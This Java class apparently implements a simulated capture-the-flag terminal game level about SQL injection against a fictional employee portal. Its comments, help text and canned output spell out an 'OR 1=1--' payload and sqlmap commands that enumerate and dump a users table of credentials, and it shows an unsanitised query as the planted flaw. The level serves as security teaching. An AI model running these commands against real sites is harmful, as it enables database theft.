package io.github.INF1009_P10_Team7.simulation.cyber.ctf;

/**
 * CTF Challenge 3  -  SQL Injection.
 *
 * Flow the player must find:
 *   curl http://10.10.10.50/login          → see login form HTML
 *   curl "http://10.10.10.50/login?id=1"   → see plain SQL response
 *   curl "...?id=1 OR 1=1--"              → SQL error / all rows dump
 *   sqlmap -u "http://10.10.10.50/login?id=1" --dbs   → list databases
 *   sqlmap -u "..." -D appdb --tables      → list tables
 *   sqlmap -u "..." -D appdb -T users --dump  → dump users table
 *   login admin S3cr3t!Flag               → authenticated
 *   cat /var/www/flag.txt                  → FLAG{sqli_d4t4b4s3_pwn3d}
 */
public class SqlInjectionChallenge implements ICTFChallenge {

    private enum Stage { INITIAL, DB_FOUND, TABLES_FOUND, DUMPED, LOGGED_IN }
    private Stage stage = Stage.INITIAL;
    private boolean solved = false;

    @Override public String getTitle()      { return "TERMINAL-03 // WEB SQL INJECTION"; }
    @Override public String getTargetInfo() { return "target: http://10.10.10.50"; }
    @Override public String getPrompt()     { return "attacker@kali:~$ "; }

    @Override
    public TerminalLine[] getWelcomeLines() {
        return new TerminalLine[]{
            TerminalLine.warn("OBJECTIVE: Exploit the login form, dump credentials, capture the flag."),
            TerminalLine.dim ("------------------------------------------------------------────"),
            TerminalLine.out ("Intel: A web app at 10.10.10.50 has a vulnerable login endpoint."),
            TerminalLine.out ("The flag is stored in /var/www/flag.txt on the server."),
            TerminalLine.dim ("Hint: curl the target first to enumerate the attack surface."),
        };
    }

    @Override
    public TerminalLine[] processInput(String raw) {
        String cmd = raw.trim();
        String lo  = cmd.toLowerCase();

        // curl / wget
        if (lo.startsWith("curl") || lo.startsWith("wget")) {
            if (lo.contains("10.10.10.50")) return handleCurl(lo);
            return new TerminalLine[]{ TerminalLine.err("curl: (6) Could not resolve host: " + extractArg(cmd)) };
        }

        // sqlmap
        if (lo.startsWith("sqlmap")) return handleSqlmap(lo);

        // login
        if (lo.startsWith("login")) return handleLogin(cmd);

        // flag read
        if (lo.startsWith("cat /var/www/flag") || lo.startsWith("cat flag")) {
            if (stage == Stage.LOGGED_IN) return catFlag();
            return new TerminalLine[]{ TerminalLine.err("Permission denied. You must authenticate first.") };
        }

        // nikto
        if (lo.startsWith("nikto")) return nikto();

        // nmap
        if (lo.startsWith("nmap") && lo.contains("10.10.10.50")) return nmapTarget();

        // misc
        if (lo.equals("help") || lo.equals("?")) return help();
        if (lo.equals("clear")) return new TerminalLine[]{};
        if (lo.equals("whoami")) return new TerminalLine[]{ TerminalLine.out("attacker") };

        String c = cmd.split("\\s+")[0];
        return new TerminalLine[]{ TerminalLine.err("bash: " + c + ": command not found") };
    }

    @Override public boolean isSolved() { return solved; }
    @Override public void reset() { stage = Stage.INITIAL; solved = false; }

    // ── curl handler ----------------------------------------─────────

    private TerminalLine[] handleCurl(String lo) {
        boolean hasId = lo.contains("?id=") || lo.contains("id=");

        if (!hasId) {
            // plain GET /login
            if (lo.contains("/login")) return curlLoginPage();
            if (lo.contains("/admin")) return new TerminalLine[]{ TerminalLine.err("HTTP 403 Forbidden") };
            return curlRoot();
        }

        // With id param
        if (lo.contains("or 1=1") || lo.contains("' or") || lo.contains("1=1")) {
            return curlSqliAll();
        }
        if (lo.contains("union") || lo.contains("select")) {
            return curlUnion();
        }
        return curlSingleRow();
    }

    private TerminalLine[] curlRoot() {
        return new TerminalLine[]{
            TerminalLine.out("HTTP/1.1 200 OK"),
            TerminalLine.out("Server: Apache/2.4.54"),
            TerminalLine.blank(),
            TerminalLine.out("<html><body>"),
            TerminalLine.out("  <h1>Employee Portal</h1>"),
            TerminalLine.warn("  <a href='/login'>Login</a>"),
            TerminalLine.out("</body></html>"),
        };
    }

    private TerminalLine[] curlLoginPage() {
        return new TerminalLine[]{
            TerminalLine.out("HTTP/1.1 200 OK"),
            TerminalLine.blank(),
            TerminalLine.out("<form method='GET' action='/login'>"),
            TerminalLine.warn("  <input name='id' placeholder='Employee ID'>"),
            TerminalLine.out("  <input name='pass' type='password'>"),
            TerminalLine.out("  <button>Login</button>"),
            TerminalLine.out("</form>"),
            TerminalLine.blank(),
            TerminalLine.dim("<!-- Debug: SELECT * FROM users WHERE id=$_GET['id'] -->"),
            TerminalLine.warn("<!-- TODO: remove debug comment before deploying!! -->"),
        };
    }

    private TerminalLine[] curlSingleRow() {
        return new TerminalLine[]{
            TerminalLine.out("HTTP/1.1 200 OK"),
            TerminalLine.blank(),
            TerminalLine.out("Welcome, employee #1."),
            TerminalLine.dim("Query: SELECT * FROM users WHERE id=1"),
        };
    }

    private TerminalLine[] curlSqliAll() {
        return new TerminalLine[]{
            TerminalLine.out("HTTP/1.1 200 OK"),
            TerminalLine.blank(),
            TerminalLine.warn("Welcome, admin!  |  Welcome, bob!  |  Welcome, alice!"),
            TerminalLine.err("SQL ERROR: You have an error in your SQL syntax near '1=1'"),
            TerminalLine.blank(),
            TerminalLine.warn("Injectable parameter confirmed! Use sqlmap to enumerate."),
            TerminalLine.dim ("sqlmap -u \"http://10.10.10.50/login?id=1\" --dbs"),
        };
    }

    private TerminalLine[] curlUnion() {
        return new TerminalLine[]{
            TerminalLine.out("HTTP/1.1 200 OK"),
            TerminalLine.err("SQL ERROR: Column count mismatch in UNION statement"),
            TerminalLine.dim("Manual UNION is tricky. Try sqlmap for automation."),
        };
    }

    // ── sqlmap handler ----------------------------------------────────

    private TerminalLine[] handleSqlmap(String lo) {
        if (!lo.contains("10.10.10.50")) {
            return new TerminalLine[]{ TerminalLine.err("sqlmap: No target specified. Use -u \"http://10.10.10.50/login?id=1\"") };
        }

        boolean hasDbs    = lo.contains("--dbs");
        boolean hasTables = lo.contains("--tables") || lo.contains("-t ");
        boolean hasDump   = lo.contains("--dump");
        boolean hasDbD    = lo.contains("-d appdb") || lo.contains("appdb");
        boolean hasTableT = lo.contains("-t users") || lo.contains("users");

        if (hasDbs) {
            if (stage.ordinal() < Stage.DB_FOUND.ordinal()) stage = Stage.DB_FOUND;
            return sqlmapDbs();
        }
        if (hasTables && hasDbD) {
            if (stage.ordinal() < Stage.TABLES_FOUND.ordinal()) stage = Stage.TABLES_FOUND;
            return sqlmapTables();
        }
        if (hasTables) {
            return new TerminalLine[]{
                TerminalLine.err("sqlmap: Specify database with -D <dbname>"),
                TerminalLine.dim("Available databases found: appdb, information_schema"),
                TerminalLine.dim("Try: sqlmap -u \"...\" -D appdb --tables"),
            };
        }
        if (hasDump && hasDbD && hasTableT) {
            if (stage.ordinal() < Stage.DUMPED.ordinal()) stage = Stage.DUMPED;
            return sqlmapDump();
        }
        if (hasDump) {
            return new TerminalLine[]{
                TerminalLine.err("sqlmap: Specify -D <db> -T <table> --dump"),
                TerminalLine.dim("Try: sqlmap -u \"...\" -D appdb -T users --dump"),
            };
        }

        // Basic scan
        return sqlmapScan();
    }

    private TerminalLine[] sqlmapScan() {
        return new TerminalLine[]{
            TerminalLine.dim ("sqlmap v1.7.8  -  automatic SQL injection tool"),
            TerminalLine.out ("[*] starting @ 03:22:11"),
            TerminalLine.dim ("[INFO] testing connection to target"),
            TerminalLine.ok  ("[INFO] target URL appears to be alive"),
            TerminalLine.warn("[WARNING] GET parameter 'id' appears injectable!"),
            TerminalLine.ok  ("[INFO] confirmed injectable: id (MySQL)"),
            TerminalLine.blank(),
            TerminalLine.info("Run with --dbs to enumerate databases."),
            TerminalLine.dim ("sqlmap -u \"http://10.10.10.50/login?id=1\" --dbs"),
        };
    }

    private TerminalLine[] sqlmapDbs() {
        return new TerminalLine[]{
            TerminalLine.dim ("[INFO] fetching database names"),
            TerminalLine.ok  ("[INFO] used SQL query: SELECT schema_name FROM information_schema.schemata"),
            TerminalLine.blank(),
            TerminalLine.out ("available databases [2]:"),
            TerminalLine.warn("[*] appdb"),
            TerminalLine.dim ("[*] information_schema"),
            TerminalLine.blank(),
            TerminalLine.info("Enumerate tables: sqlmap -u \"...\" -D appdb --tables"),
        };
    }

    private TerminalLine[] sqlmapTables() {
        return new TerminalLine[]{
            TerminalLine.dim ("[INFO] fetching tables for database: appdb"),
            TerminalLine.blank(),
            TerminalLine.out ("Database: appdb  -  tables [3]:"),
            TerminalLine.warn("[*] users"),
            TerminalLine.dim ("[*] sessions"),
            TerminalLine.dim ("[*] audit_log"),
            TerminalLine.blank(),
            TerminalLine.info("Dump users: sqlmap -u \"...\" -D appdb -T users --dump"),
        };
    }

    private TerminalLine[] sqlmapDump() {
        return new TerminalLine[]{
            TerminalLine.dim ("[INFO] fetching columns for table 'users'"),
            TerminalLine.dim ("[INFO] fetching entries for table 'users'"),
            TerminalLine.blank(),
            TerminalLine.out ("Table: users"),
            TerminalLine.dim ("+----+----------+---------------------+----------+"),
            TerminalLine.dim ("| id | username |       email         | password |"),
            TerminalLine.dim ("+----+----------+---------------------+----------+"),
            TerminalLine.out ("| 1  | admin    | admin@company.local | S3cr3t!Flag |"),
            TerminalLine.out ("| 2  | bob      | bob@company.local   | bob123   |"),
            TerminalLine.out ("| 3  | alice    | alice@company.local | al1c3pw  |"),
            TerminalLine.dim ("+----+----------+---------------------+----------+"),
            TerminalLine.blank(),
            TerminalLine.warn("Credentials dumped! Try: login admin S3cr3t!Flag"),
        };
    }

    // ── login handler ----------------------------------------─────────

    private TerminalLine[] handleLogin(String cmd) {
        String[] parts = cmd.split("\\s+");
        if (parts.length < 3) {
            return new TerminalLine[]{
                TerminalLine.err("Usage: login <username> <password>"),
            };
        }
        String user = parts[1];
        String pass = parts[2];

        if (user.equals("admin") && pass.equals("S3cr3t!Flag")) {
            stage = Stage.LOGGED_IN;
            return new TerminalLine[]{
                TerminalLine.ok  ("Authentication successful."),
                TerminalLine.ok  ("Logged in as: admin"),
                TerminalLine.ok  ("Remote shell established."),
                TerminalLine.blank(),
                TerminalLine.info("You now have read access to /var/www/"),
                TerminalLine.dim ("cat /var/www/flag.txt"),
            };
        }
        return new TerminalLine[]{
            TerminalLine.err("Authentication failed for user '" + user + "'"),
        };
    }

    // ── misc ------------------------------------------------------------─────

    private TerminalLine[] nmapTarget() {
        return new TerminalLine[]{
            TerminalLine.out("Nmap scan report for 10.10.10.50"),
            TerminalLine.ok ("80/tcp  open  http   Apache httpd 2.4.54"),
            TerminalLine.dim("3306/tcp open mysql  MySQL 8.0"),
        };
    }

    private TerminalLine[] nikto() {
        return new TerminalLine[]{
            TerminalLine.out("- Nikto v2.1.6"),
            TerminalLine.warn("+ /login: DEBUG SQL comment found in source."),
            TerminalLine.warn("+ GET parameter 'id' is potentially injectable."),
            TerminalLine.dim ("+ MySQL/3306 may be reachable from the web process."),
        };
    }

    private TerminalLine[] catFlag() {
        solved = true;
        return new TerminalLine[]{
            TerminalLine.blank(),
            TerminalLine.ok  ("||||||||||||||||||||||||||||||||||||||"),
            TerminalLine.ok  ("  FLAG{sqli_d4t4b4s3_pwn3d}"),
            TerminalLine.ok  ("||||||||||||||||||||||||||||||||||||||"),
            TerminalLine.blank(),
            TerminalLine.warn(">>> DATABASE COMPROMISED  -  FINAL KEY EXTRACTED <<<"),
        };
    }

    private TerminalLine[] help() {
        return new TerminalLine[]{
            TerminalLine.info("Recon tools:"),
            TerminalLine.out ("  nmap 10.10.10.50               -  port scan"),
            TerminalLine.out ("  nikto -h 10.10.10.50           -  web scan"),
            TerminalLine.out ("  curl http://10.10.10.50/login  -  view page"),
            TerminalLine.blank(),
            TerminalLine.info("Exploitation:"),
            TerminalLine.out ("  sqlmap -u \"http://10.10.10.50/login?id=1\" --dbs"),
            TerminalLine.out ("  sqlmap -u \"...\" -D appdb --tables"),
            TerminalLine.out ("  sqlmap -u \"...\" -D appdb -T users --dump"),
            TerminalLine.out ("  login <user> <password>"),
            TerminalLine.out ("  cat /var/www/flag.txt"),
        };
    }

    private String extractArg(String cmd) {
        String[] p = cmd.split("\\s+", 2);
        return p.length > 1 ? p[1].trim() : "";
    }
}
